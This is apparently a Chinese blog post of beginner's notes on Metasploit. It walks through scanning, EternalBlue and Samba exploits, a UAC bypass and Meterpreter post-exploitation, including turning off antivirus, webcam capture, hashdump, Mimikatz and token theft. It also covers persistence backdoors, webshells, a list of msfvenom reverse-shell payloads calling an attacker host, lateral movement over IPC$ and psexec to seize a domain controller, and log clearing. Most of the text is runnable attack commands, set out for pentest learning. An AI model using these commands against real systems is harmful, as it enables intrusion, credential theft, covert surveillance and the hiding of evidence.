# Metasploit初学-散记


# MSF
>最牛X的地方是：支持整个渗透测试过程

## <font color=red> 理论方面</font>
![](http://image.xpshuai.cn/msf_1.png)


#### 技术架构
**1.辅助模块（auxiliary）**
包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块
![](http://image.xpshuai.cn/msf_2.png)

**2.渗透攻击模块(exploits)**
利用程序，针对漏洞、权限进行利用，是主要使用的模块
![](http://image.xpshuai.cn/msf_3.png)

**3.攻击载荷模块(payload)**
用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取
![](http://image.xpshuai.cn/msf_5.png)

**4.空指令模块(nops)**
![](http://image.xpshuai.cn/msf_5.png)

**5.编码器模块(encoders)**
![](http://image.xpshuai.cn/msf_6.png)

**6.后渗透攻击模块(post)**
![](http://image.xpshuai.cn/msf_7.png)

**7.免杀模块(evasion)**







#### 接口
MSF有四种接口对外提供：`msfconsole`, `msfcli`,  `msfgui`,  `msfweb`



#### 为什么要使用Metasploit
![](http://image.xpshuai.cn/msf_8.png)
开发版是没有生成报告的功能的（商业版才有），但是开发版的脚本更多，每个版本各有利弊

1. 情报搜集阶段
![](http://image.xpshuai.cn/msf_9.png)
有数据库

2. 威胁建模阶段
![](http://image.xpshuai.cn/msf_10.png)

3. 漏洞分析阶段
![](http://image.xpshuai.cn/msf_11.png)

4. 后渗透攻击模块
![](http://image.xpshuai.cn/msf_13.png)

5. 报告生成模块
![](http://image.xpshuai.cn/msf_13.png)

---------------------------------------------


## <font color=red> 使用MSF</font>
#### 准备使用
**启动MSF**
`msfconsole`
可以配置数据库等

**更新MSF**
```bash
apt-get update
apt-get install metasploit-framework
```

**软件安装目录**
```bash
/usr/share/metasploit-framework
# 数据目录(其中一些字典和脚本我们用的时候可以拿)
```

**模块**
一个模块就是一个rb脚本


#### 情报搜集
> 首先search 搜索有哪些可用的模块

**1.网站敏感目录扫描：**
```bash
/usr/share/metasploit-framework/modules/auxiliary/scanner 里面自己看都有啥

## 使用 brute_dirs, dir_listing, dir_Scanner等辅助模块来进行敏感目录扫描
# 他们主要使用暴力猜解的方式工作，需要提供目录字典

# 使用模块
use auxiliary/scanner/http/dir_scanner
# 查看详细信息
info
# 查看需要设置的参数
show options   

# 设置参数（取消设置参数是 unset）
set RHOTS 192.168.0.101
set PATH /cms/
# 攻击
exploit
# 返回上一级退出当前模块
back

# 两个可选命令
setg, unsetg  # 用于在msfconsole中设置或取消设置全局性的参数，从而避免重复输入相同的值
```

使用常用的辅助模块进行服务扫描(`search scanner`)

**2.主机发现**
```bash
## 用于主机发现的辅助模块，位于 modules/auxiliary/scanner/discovery
use /auxiliary/scanner/discovery/arp_sweep
```
![](http://image.xpshuai.cn/msf_14.png)

还是nmap速度快, 可以直接在msf中使用`nmap`

**3.端口扫描**
search  portscan
```bash
auxiliary/scanner/portscan/ack
auxiliary/scanner/portscan/syn  # 推荐这个(速度快，准确，不易被发现)
auxiliary/scanner/portscan/xmas
auxiliary/scanner/portscan/ftpbounce
auxiliary/scanner/portscan/tcp

use ......
show options
set xxx
```
![](http://image.xpshuai.cn/msf_15.png)

**4.探测服务详细信息**
![](http://image.xpshuai.cn/msf_16.png)


**5.服务查点**
用户服务扫描和查点的工具，通常以`[server_name]_version`命名

- telnet服务查点(查哪些主机开了telnet服务，而namp是查看某主机开放了哪些服务)
![](http://image.xpshuai.cn/msf_17.png)

- SSH服务查点
```bash
use auxiliary/scanner/ssh/ssh_version
# 口令爆破
use auxiliary/scanner/ssh/ssh_login
```

- MSSQL服务查点
```bash
use auxiliary/scanner/mssql/mssql_version
```



**永恒之蓝实践**
```bash
# 先扫描是否存在
use auxiliary/scanner/smb/ms17_010_eternalblue
...

# 载利用攻击模块
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOST ...
...
exploit
```


#### 漏洞利用
收集完信息后，选择正确的exploit，payload

这里假设是Samba
`info exploit/multi/samba/usermap_sript`,  可以查看到利用成功率`Rank`越高，成功率越大
`use exploit/multi/samba/usermap_sript`
`show options`
`set PAYLOAD cmd/unix/reverse`
... ... 


#### Bypass UAC
```bash
use exploit/windows/local/bypassuac
set session 1
run
```


#### Meterpreter（属于后渗透攻击）
>Metasploit框架中的一个扩展模块

作为`溢出成功以后的`攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接
https://www.cnblogs.com/backlion/p/9484949.html
```bash
Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。


# 优势
- 纯内存工作模式，不需要对内存进行写入操作
- 使用加密通信协议，且可以同时与几个信道通信
- 在被攻击进程内工作，不需要创建新的进程
- 易于在多进程之间迁移
- 平台通用
```

**进程迁移**
刚获取Meterpreter shell的时候，是脆弱的(用户随时可能关闭)，所以第一时间是移动shell，把它和一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作(更不易被发现)
```bash
ps    # 获取目标正在运行的进程
getpid    # 查看Meterpreter shell的进程号
mirate 448    # 把shell移动到PID为448的进程里(因为这里这个稳定，看情况来吧)

getpid  # 发现shell的进程迁移OK(原来的进程会自动关闭，如果没关闭就手动关掉：kill xxx_pid)

# 自动迁移进程指令(系统会自动寻找合适的进程然后迁移)
run post/windows/manage/migrate
```



**常用命令**
```bash
########## 系统命令（收集系统信息）
systeminfo	# 查看系统信息
run post/windows/gather/checkv    # 检查是否为虚拟机
idletime    # 目标机器最近运行时间

ifconfig/ipconfig 	# 查看网卡信息
route	# 查看路由信息，设置路由（做跳板用）

background		# 把会话放到后台，这个会话继续保持
sessions     # 查看会话列表
sessions -i 2	# 进入切回会话2

getuid	# 获取当前用户id权限
run post/windows/manage/killav # 关闭杀毒(其他命令自己探索)
run post/windows/manage/enable_rdp # 开启目标机器的远程桌面

run post/windows/manage/autoroute # 查看目标机的本地子网情况
# 接着进行跳转
background # 把当前终端隐藏在后台
route add 192.168.0.111 255.255.255.0 1  # 给指定会话id添加路由(可以添加其他地址到被攻陷的机器的路由表上，借助被攻陷的机器来攻击其他网络)
route print    # 查看路由添加结果
# 接着查看
run post/windows/gather/enum_logged_on_users   # 列举当前有多少用户登录了主机
run post/windows/gather/enum_logged_on_users   # 继续列举安装在目标机器上的应用
run post/windows/gather/credentials/windows_autologin  # 很多用户习惯将计算机设置自动登录(抓取自动登录的密码)，如果看不到任何信息，就需要拓展插件Expia
load espia # 先加载该插件
screengrab    # 就可以抓取此时目标机器的屏幕截图
screenshot    # 也是截屏

webcam snap  # 打开目标机器摄像头，拍摄一张照片
webcam_stream  # 开始摄像头(直播模式)，在浏览器输入给出的url发那个问即可

shutdown	   # 关机

shell		# 进入目标系统的shell下面
exit        # 停止meterpreter会话（也可以停止shell并返回到meterpreter）
quit		# 关闭当前的Meterpreter会话，返回MSF终端





########## 文件系统命令
pwd	/   getwd  # 查看目标机器当前目录 
getlwd    # 查看本机当前目录 
cd	# 切换目录(注意\的转义)
ls	# 查看当前目录内容
search	-f *.txt	  -d c: # 搜索文件（search -h 查看帮助） -d指定目录， -f搜索模式
upload	/var/www/test.txt c:\  # 上传文件到目标机器的路径
download	 c:\test.txt  # 下载文件(默认保存到msf的目录)
cat	# 查看文件内容
edit # 编辑文件
execute	-f c:\\windows\\system32\\calc.exe  # 执行文件


run keylogrecorder   .... # 键盘记录？
```

###### 后渗透攻击：提权
- 纵向提权
- 横向提权

```bash
# 获取Meterpreter Shell之后，查看我们是什么权限
# Meterpreter 下输入
shell    # 进入目标的cmd
whoami /groups  # 查看当前权限
## 下面就开始进行提权了
# 用本地溢出漏洞，利用现成的exploit
```

**1.利用WMIC实战MS16-032本地溢出漏洞**
```bash
# WMIC是win一个命令行工具(交互模式/非交互模式)，不仅可管理本机还可管理域内所有远程主机(前提是有权限)，而被管理者不需要安装WMIC
# WMIC在信息搜集和后渗透十分有用，可以调查目标机的进程，服务，用户，用户组，网络连接，硬盘信息，时区，操作系统信息等


# 假设拿到了Meterpreter shell
getuid
getsystem    # 尝试提权，但是失败
# 接着查看系统打了的补丁(传统方法：在目标cmd输入systeminfo，或查询C:\windows\补丁号.log)
# 这里利用WMIC命令列出安装的补丁
WMIC qfe get Caption,Description,HotFixID,IntalledOn
# 找到打的补丁后，去找exp(然后将系统安装的补丁编号与提权exp编号比对，然后使用没有编号的exp进行提权)
## 漏洞信息网站： 安全焦点， Expolit-DB
# 接下来准备提权(把Meterpreter放到后台：background), 然后搜索ms16-032
search ms16-032    # 如果找不到，可以试试升级：msfupdate  或者手动添加相应漏洞EXP
use exploit/windows/local/ms16_032_secondary_logon_handle_privsec
set session 1
run
# 会返回一个新的session，进入，执行getuid 反省是system权限了
```

**2.令牌窃取**
令牌(Token)就是系统的`临时密钥`, 相当与账户密码，特点是随机性和不可预测  
在假冒令牌攻击中需要使用`Kerberos`协议(一种网络认证协议，其设计目的是通过密钥系统为客户机/服务器应用程序提供强大的认证服务)
Kerberos工作机制：
xxx待补充

假冒令牌实战利用
```bash
# 假设已经拿到了Meterpreter shell
getuid
getsystem # 提权失败

use incognito
list token -u # 列出可用的token(会看到结果，根据Meterpreter shell的权限而定)
# 假设从输出信息中看到了目标机器的..., 继续在incognito中执行
impersonate_token WIN7-TEST\\Administrator # 调用incognito中的这个impersonate_token 命令，来假冒Admin进行攻击(注意是两个反斜杠)
shell
whoami  # 查看权限

```

Hash攻击
```bash
###### 1.是使用Hashdump抓取密码
hashdump   # 导出主机的sam数据库的hash

# 另一个更强大的模块
run winsows/gather/smart_hashdump  # 若是win7,且开启了uac，就要使用绕过uac的模块再继续



##### 2.使用Quarks PwDump抓取密码
win32下的一款工具，导出信息十分全面，支持系统版本十分广泛
具体参数再查
QuarksPwDump.exe -dh1 -o 1.txt
# 还可配合在 Ntdsutil 工具到处DC的密码

ps: win的密码会加密存放在/windows/system32/config/sam



##### 3.使用Windows Credentials Editor抓取密码
WCE(Windows Credentials Editor)  功能强大，不过必须是管理员权限，还要主要免杀
# 先上传wce到目标
upload wce.exe
# 在目标的shell下执行
wce -w  # 便会成功提取明文管理员密码(默认是-l命令读取，-f强制安全方式读取，-g用来计算密码，-c制定会话来执行cmd，-v显示详细信息，-w最关键 --> 查看已登录的明文密码)



##### 4.使用Mimikatz抓取密码
msf内置了Mimikatz成为一个peterpreter脚本集成
load Mimikatz
help Mimikatz
# mimikatz_command # 可以让我们使用Mimikatz全部功能, 如(:: 请求某个模块可用的选项)
mimikatz_command -f hash::
mcv    # 抓取系统hash值
kerberos    # 抓取系统票据
wdigest   # 获取系统账户信息
mimikatz_command -f samdump::hash  # 抓取hash

## mimikatz 除了抓取hash，还有其他功能：比如 Handle模块，list\kill进程，模拟用户令牌等
mimikatz_command -f handle::
mimikatz_command -f service::  # servvice模块可以对win的服务进行...
mimikatz_command -f crypto::  # crypto可以列出 导出任何证书，以及存储在目标机器上的相应的私钥

# mimikatz 也支持PowerShell调用
脚本P228


能在PowerShell中执行mimikatz，偷窃和注入凭证，伪造Kerbero票证创建，还有其他很多功能
```



###### 后渗透攻击：移植漏洞利用代码模块
支持不同语言编写的模块移植进去，允许开发者开发自己的漏洞利用模块


MS17-010 --> 微软SMB远程代码执行漏洞

演示：移植MS17-010漏洞利用代码
```bash
# MS17-010 在msf中虽然有集成脚本，但是不适用于03系统，从网上自行下载
# clone脚本到本地，把rb脚本复制到/usr/share/metasploit-framework/modules/exploits/windows/smb下
raload all  # 然后在msf中重新加载脚本
之后就能search到了，用use加载它
# 开始
msfovenom 生成一个DLL文件(在下面set payload)
然后设置该模块的参数
run



```



###### 后渗透攻击：后门
提取完成之后，就需要留后门了  

1.操作系统后门
```bash
##### 1.Cymothoa后门
可以将ShellCode注入到现有进程的后门工具
该后门能与被注入进程共存，且如果不检查内存是发现不了的
该后门注入系统的某一进程，返回的是该进程相应的权限(并不需要root)， 但是关闭进程或重启，后门就会停止运行

ps -aux  # 查看程序的pid， Win下是 tasklist
# -p指定目标进程的PID，-y指定payload服务端口，-s指定ShellCode编号(cymothoa -S 查看) 
cymothoa -p 862 -s 1 -y 5555
# 连接后门
nc -nvv 192.168.0.112 5555




##### 2.Persistence后门
使用安装自启动方式的持续型后门，可以用它创建注册表和文件
run persistence -h  # 查看命令选项
# 创建持久型后门
run persistence -A -S -U -i 60 -p 4321 -r 162.168.0.112 
# -A自动启动payload，-S系统启动时自动加载，-U用户登录时自动启动， -X开机时自动加载，-i回连时间间隔，-P监听端口号， -r 目标机器地址

sessions  # 发现会话已成功获取
```

2.Web后门(WebShell)
```bash
# 中国菜刀，AntSword， Cknife， 冰蝎，Weevely(kali使用最多，但是只支持php)，msf也有自带的后门

##### 1. Meterpreter 后门
msf中有一个叫 php meterpreter 的payload，里哟你他可以创建具有Meterpreter功能的php webshell
# 使用msfvenom创建一个webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=1234 -f raw > p.php
# 上传webshell到目标机器
# 本机运行 msf multi-handler 开始监听
use exploit/multi/handlers
set payload php/meterpreter/reverse_tcp
...
run
# 访问webshell页面
# 获得反弹的 Metasploit Shell



##### 2. Aspx Meterpreter 后门
msf下的 shell_reverse_tcp 的payload，可以创建多个版本的具有meterpreter功能的Shellcode
这里以aspx为例, 步骤和上面的那个大致相同
show payloads
use windows/shell_reverse_tcp
set ...
save

generate -h  # 查看帮助
generate -t aspx  # 生成aspx版本的ShellCode
# 保存内容到x.aspx，上传到服务器
# 本地设置监听
use exploit/multi/handlers
set payload windows/meterpreter/reverse_tcp
...
run
# 访问webshell页面
# 获得反弹的 Metasploit Shell
后续就可以进行提权等操作了
```



------------------


#### msf基础命令
```bash
search ms17  # 查找
use exploit/multi/handler    # 使用
info    # 查看信息
show expoits/payloads/options    # 显示可用信息
exploit /run    # 执行
back    # 返回上一级
exploit -j     # 后台运行
sessions    # 查看当前可用会话
session -i 1  # 连接某个会话
sessions -K    # 杀死所有活跃会话
```



#### Meterpreter命令：
```bash
getuid    # 查看用户名，从而查看当前会话具有的权限
sysinfo    # 列出主机信息
getprivs    # 尽可能多地获取目标主机上的特权
getystem    # 通过各种攻击向量来提升到系统用户权限
hashdump    # 导出目标主机中的口令哈希值
screenshot    # 屏幕截图
background    # 将当前的meterpreter shell转为后台执行
quit    # 关闭当前meterpreter会话，回到msf终端

ps    # 显示所有运行进程
migrate PID    # 迁移到制定的进程PID
execute -f cmd.exe -i  # 执行cmd.exe命令并进行交互
shell    # 以所有可用令牌来进行一个交互的shell
```


#### msfvenom基础
```bash
# 参考：msf下的各种生成payload命令  http://www.cnblogs.com/backlion/p/6000544.html
### 二进制
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

# Windows 生成exe程序
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f exe -o /var/www/html/payload.exe

# Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho


### Web Payloads
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war


### Scripting Payloads
# Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl


### Shellcode:
# Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

# Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

# Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>


### Handler
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```

#### 反弹Shell
```bash
### 第一种(这个监听更综合一点)： use exploit/multi/hander
# 1.msfvenom生成程序
# 2.使用handler执行exp
# 3.在目标机器运行msfvenom生成程序
# 4.返回session



### 第二种： use exploit/multi/script/web_delivery
# 1.使用web_delivery返回脚本执行并加载exp
# 2.在目标机器运行脚本
# 3.返回session

# Note: 这里要使用的payload与上面使用生成器生成的名字要一致
```





----------------------------------

## 一些小思路

#### 信息搜集
当拿下第一天内网主机的权限(提权不了时)，就要以此服务器为跳板攻击其他服务器

先进行网络/用户组/DC等的收集


###### 获取另外一台服务器权限
**若权限不够导致不能直接攻击域服务器**
- 使用meterpreter当前拥有的权限添加到内网路由，进行弱口令扫描
- 用Powershell对内网进行扫描
- 架设Socks4a, 然后socks会自动进行内网扫描
- 利用当前权限进行内网IPC$渗透
- 其他

通过分析，我们输入`net view`, 发现列举的机器选择一个和我们机器名相似的服务器试，成功率一般很高`net use \\WIN7_TEST2\c$`


使用经典的`IPC$入侵`（通过win默认启动的ipc共享来获得计算机控制权）：
```bash
net use \192.168.0.112\ipc$   # 连接这个ip的ipc共享
copy srv.exe \192.168.0.112\ipc$  # 复制srv(免杀的payload)到目标
net time \192.168.0.112  # 查看时间
at \192.168.0.112 18:18 srv.exe    # 用at命令在18点18分启动srv.exe (这里设置的时间要比主机时间快)
# 如果没有 at命令，试试新的计划任务命令： schtask 
# 回到msf的handler进行监听，到时间会反弹shell
然后进入这个新的主机，查看包括权限在内的信息, 也可以mimikatz抓密码: run /post/windows/gather/mimikatz
也可以上传对应位数的mimikatz到该主机 upload /home/x64.exe c:\
shell    # 进入到目标的shell，再执行

```

#### Powershell寻找域管在线服务器
使用`PowerView`脚本的`Invoke-User Hunter`上传到目标机器，然后执行`Invoke-UserHunter`
```bash
powershell.exe -exec bypass -Command "&{Import-Module .powerview.ps1;Invoke-UserHunter}"
```
找到域管理员当前在线登录的主机后，入侵该主机，然后把它迁移到域管理员登录所在的进程，这样就有了域管的理的权限



#### 获取域管权限
渗透域控
```bash
# 先尝试
getsystem
getuid  #查看当前用户，因为之前知道这账户的域管理员
ps    # 找到域管理所在进程
migrate 30560 # 迁移进程过去(也可以用msf中窃取令牌的功能)
# 查看主域控的IP
shell    # 先进去cmd
net time
# 使用IPC$入侵来返回一个域控的meterpreter shell(操作见上面的步骤)
net user test test123 /ad /domain # 添加域管理员
net group "domain admins" /domain  #查看域管理员是否添加成功
```


#### 登录域控
下面要登录域控，抓取hash

常见的登录域控的方法：
```bash
- 利用IPC上传AT&Achtasks远程执行命令
- 利用端口转发或Socks登录DC的3389
- 登录对方内网一台主机使用PsTools工具包中的PsExec来反弹shell
- 使用msf下的PsExec，psexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等PsExec类工具反弹shell
- 使用msf下的smb_login反弹shell
- 使用WMI来进行攻击
- 使用PsRemoting posershel远程执行命令
- 其他
```
最常见的是msf下的PsEcex反弹meterpreter(1.msf下的PsEcex模块   2.cuestom模块,建议使用Veil之类的工具来生成免杀的payload)
```bash
use /exploit/windows/smb/psexec
set smbuser test
set smbpass test123
set smbdomain HACKER
set rhost 192.168.0.111
run
# 获得反弹的meterpreter shell之后，先迁移进程，查看DC的系统系统和sesssion控制图
ps
migrate 2166
getuid
sysinfo
sessions    # 查看我们获取的sessions

# 抓hash方法：
- msf自带的hashdump(有system权限才可以)或smart_dump模块导出用户的Hash
- 使用PowerShell的相应模块导出hash
- 使用WCE、Mimikatz等工具
- 其他
```



#### SMB爆破内网
有了DC的密码，接下来只需快速在内网扩大控制权限

- 利用当前获取的DC的账户密码，对整个域控的IP短进行扫描
- 使用SMB下的smb_login模块
- 端口转发或socks代理进内网

```bash
## 先在msf添加路由，然后使用smb_login模块Huo psexec_Scanner模块进行爆破
background
route add 192.168.0.115 255.255.255.0  2    # 目的是访问1192.168.0.115将通过meterpreter的会话 2 来访问：
search smb_login
use auxiliary/scanner/smb/smb_login
set ...
run

# 扫描内网
creds  # 然后获得大量内网服务器的密码，下面就可以畅游内网了

# 可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或第三方软件(这里使用简单的第一种)
portfwd add -l 5555 -p 3389 -r 127.0.0.1
background
```


#### 清理日志
**步骤**
- 删除之前添加的域管理员的帐号
- 删除所有在渗透中使用的工具
- 删除应用程序、系统和安全日志
- 关闭所有的Meterpreter连接

```bash
net user test /dels
clearev    # 删除日志
sessions
sessions -K # 关闭所有msf连接
```













---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/  

